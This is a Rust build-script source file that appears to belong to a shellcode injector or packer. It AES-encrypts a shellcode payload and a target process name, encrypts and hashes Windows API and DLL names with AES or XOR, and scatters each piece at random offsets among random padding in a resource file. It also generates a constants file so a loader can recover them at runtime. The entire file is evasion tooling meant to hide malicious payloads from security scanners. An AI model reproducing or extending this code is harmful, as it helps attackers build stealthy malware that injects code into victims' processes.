use rand;
use rand::seq::SliceRandom;
use rand::Rng;
use std::fs;
use std::ops::Range;
use std::path::Path;
use crate::hash::*;

include!("build_config.rs");
include!("build_util.rs");

type BuildFn = fn(&mut ResourceGenerator, &mut Vec<u8>);

struct AESString {
    string_name: &'static str,
    encrypted: Vec<u8>,
    offset: usize,
}

struct XORString {
    string_name: &'static str,
    encrypted: Vec<u8>,
    offset: usize,
    key: Vec<u8>,
    key_offset: usize,
}

struct AESHash {
    string_name: &'static str,
    encrypted: Vec<u8>,
    offset: usize,
}

struct XORHash {
    string_name: &'static str,
    encrypted: Vec<u8>,
    offset: usize,
    key: Vec<u8>,
    key_offset: usize,
}

pub struct ResourceGenerator {
    aes_key: Vec<u8>,
    aes_key_offset: usize,
    aes_iv: Vec<u8>,
    aes_iv_offset: usize,
    target: Vec<u8>,
    target_offset: usize,
    shellcode: Vec<u8>,
    shellcode_offset: usize,
    aes_strings: Vec<AESString>,
    xor_strings: Vec<XORString>,
    aes_hashes: Vec<AESHash>,
    xor_hashes: Vec<XORHash>,
}

impl ResourceGenerator {
    fn new() -> Self {
        let aes_iv = generate_random_bytes(get_iv_len());
        let aes_key = generate_random_bytes(get_key_len());

        let target = aes_encrypt_bytes(TARGET_PROCESS.as_bytes(), &aes_key, &aes_iv);

        let shellcode = aes_encrypt_bytes(
            fs::read(SHELLCODE_PATH)
                .expect("Could not read shellcode from disk.")
                .as_slice(),
            &aes_key,
            &aes_iv,
        );

        let mut aes_strings = vec![];
        let mut aes_hashes = vec![];
        for string_name in AES_STRINGS {
            let encrypted = aes_encrypt_bytes(string_name.as_bytes(), &aes_key, &aes_iv);
            aes_strings.push(AESString {
                string_name,
                encrypted,
                offset: usize::MAX,
            });

            //also store the hash, if it's needed.
            let hash = if string_name.ends_with(".dll") || string_name.ends_with(".DLL") {
                let w_string = string_name.encode_utf16().collect::<Vec<u16>>();
                hash_case_insensitive(w_string.as_ptr() as usize, w_string.len() * 2)
            } else {
                let mut c_string = string_name.to_string();
                c_string.push(0 as char);
                hash(string_name.as_ptr() as usize)
            };

            let encrypted = aes_encrypt_bytes(&hash.to_ne_bytes(), &aes_key, &aes_iv);
            // if string_name == "NtFlushInstructionCache" {
            // }
            // if string_name == "GetProcAddress" {
            // }
            // if string_name == "VirtualAlloc" {
            //
            // }

            aes_hashes.push(AESHash {
                string_name,
                encrypted,
                offset: usize::MAX,
            })
        }

        let mut xor_strings = vec![];
        let mut xor_hashes = vec![];
        for string_name in XOR_STRINGS {
            let key = generate_random_bytes(string_name.len());
            let encrypted = xor_encrypt_bytes(string_name.as_bytes(), &key[..]);
            xor_strings.push(XORString {
                string_name,
                encrypted,
                offset: usize::MAX,
                key,
                key_offset: usize::MAX,
            });

            //also generate the hash, if it's needed
            let hash = if string_name.ends_with(".dll") || string_name.ends_with(".DLL") {
                let w_string = string_name.encode_utf16().collect::<Vec<u16>>();
                hash_case_insensitive(w_string.as_ptr() as usize, w_string.len() * 2)
            } else {
                let mut c_string = string_name.to_string();
                c_string.push(0 as char);
                hash(c_string.as_ptr() as usize)
            };
            let hash = hash.to_ne_bytes();

            let key = generate_random_bytes(hash.len());
            let encrypted = xor_encrypt_bytes(&hash, key.as_slice());
            xor_hashes.push(XORHash {
                string_name,
                encrypted,
                offset: usize::MAX,
                key,
                key_offset: usize::MAX,
            })
        }

        ResourceGenerator {
            aes_key,
            aes_key_offset: 0,
            aes_iv,
            aes_iv_offset: 0,
            target,
            target_offset: 0,
            shellcode,
            shellcode_offset: 0,
            aes_strings,
            xor_strings,
            aes_hashes,
            xor_hashes,
        }
    }

    fn add_target_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        self.target_offset = payload.len();
        payload.extend(&self.target);
    }

    fn add_aes_string_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        let mut aes_string = self.aes_strings.pop().expect("No string info to pop!");
        aes_string.offset = payload.len();
        payload.extend(&aes_string.encrypted);
        self.aes_strings.insert(0, aes_string);
    }

    fn add_aes_hash_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        let mut aes_hash = self.aes_hashes.pop().expect("No string info to pop!");
        aes_hash.offset = payload.len();
        payload.extend(&aes_hash.encrypted);
        self.aes_hashes.insert(0, aes_hash);
    }

    fn add_xor_string_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        let mut xor_string = self.xor_strings.pop().expect("No string info to pop!");
        xor_string.offset = payload.len();
        payload.extend(&xor_string.encrypted);

        //put the key in after
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        xor_string.key_offset = payload.len();
        payload.extend(&xor_string.key);
        self.xor_strings.insert(0, xor_string);
    }

    fn add_xor_hash_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        let mut xor_hash = self.xor_hashes.pop().expect("No string info to pop!");
        xor_hash.offset = payload.len();
        payload.extend(&xor_hash.encrypted);

        //put the key in after
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        xor_hash.key_offset = payload.len();
        payload.extend(&xor_hash.key);
        self.xor_hashes.insert(0, xor_hash);
    }

    fn add_aes_key_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        self.aes_key_offset = payload.len();
        payload.extend(&self.aes_key);
    }

    fn add_aes_iv_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        self.aes_iv_offset = payload.len();
        payload.extend(&self.aes_iv);
    }

    fn add_shellcode_to_payload(&mut self, payload: &mut Vec<u8>) {
        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        self.shellcode_offset = payload.len();
        payload.extend(&self.shellcode);
    }

    fn build_consts_file(&self) {
        let mut consts = vec!["#![allow(unused)]".to_string()];

        consts.push(format!(
            "pub const {}: u32 = {:#X};",
            "RESOURCE_ID", RESOURCE_ID
        ));

        consts.push(format!("pub const {}: usize = {:#X};", "RT_RCDATA", 10));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_KEY_POS", self.aes_key_offset
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_KEY_LEN",
            self.aes_key.len()
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_IV_POS", self.aes_iv_offset
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "AES_IV_LEN",
            self.aes_iv.len()
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "TARGET_POS", self.target_offset
        ));
        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "TARGET_LEN",
            self.target.len()
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "SHELLCODE_POS", self.shellcode_offset
        ));

        consts.push(format!(
            "pub const {}: usize = {:#X};",
            "SHELLCODE_LEN",
            self.shellcode.len()
        ));

        consts.push(format!(
            "pub const HASH_KEY: u32 = {:#X};",
            HASH_KEY
        ));

        for string in &self.aes_strings {
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_POS",
                string.offset
            ));
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_LEN",
                string.encrypted.len()
            ));
        }

        for string in &self.aes_hashes {
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_HASH_POS",
                string.offset
            ));
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_HASH_LEN",
                string.encrypted.len()
            ));
        }

        // consts.push(format!(
        //     "pub const {}: [u8;{:#X}] = {:#X?};",
        //     "KEY_BYTES",
        //     self.aes_key.len(),
        //     self.aes_key
        // ));
        //
        // consts.push(format!(
        //     "pub const {}: [u8;{:#X}] = {:#X?};",
        //     "IV_BYTES",
        //     self.aes_iv.len(),
        //     self.aes_iv
        // ));

        for string in &self.xor_strings {
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_POS",
                string.offset
            ));
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_LEN",
                string.encrypted.len()
            ));
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_KEY",
                string.key_offset
            ));
        }

        for string in &self.xor_hashes {
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_HASH_POS",
                string.offset
            ));
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_HASH_LEN",
                string.encrypted.len()
            ));
            consts.push(format!(
                "pub const {}: usize = {:#X};",
                string.string_name.to_uppercase().replace(".", "_") + "_HASH_KEY",
                string.key_offset
            ));
        }

        fs::write("src/consts.rs", consts.join("\n")).expect("Could not write consts file.");
    }

    fn build_resource_file(&mut self) {
        self.aes_strings.shuffle(&mut rand::thread_rng());

        let mut functions: Vec<BuildFn> = vec![
            ResourceGenerator::add_aes_key_to_payload,
            ResourceGenerator::add_aes_iv_to_payload,
            ResourceGenerator::add_shellcode_to_payload,
            ResourceGenerator::add_target_to_payload,
        ];

        for _ in &self.aes_strings {
            functions.push(ResourceGenerator::add_aes_string_to_payload);
            functions.push(ResourceGenerator::add_aes_hash_to_payload);
        }

        for _ in &self.xor_strings {
            functions.push(ResourceGenerator::add_xor_string_to_payload);
            functions.push(ResourceGenerator::add_xor_hash_to_payload);
        }

        functions.shuffle(&mut rand::thread_rng());
        let mut payload = vec![];
        for function in functions {
            function(self, &mut payload)
        }

        let bytes = generate_random_bytes(rand::thread_rng().gen_range(RANGE_START..RANGE_END));
        payload.extend(bytes);

        if !Path::new("rsrc/").is_dir() {
            fs::create_dir("rsrc/").expect("Could not create directory");
        }
        fs::write(format!("rsrc/{}", RESOURCE_NAME), payload)
            .expect("Could not write payload file.");
    }
}
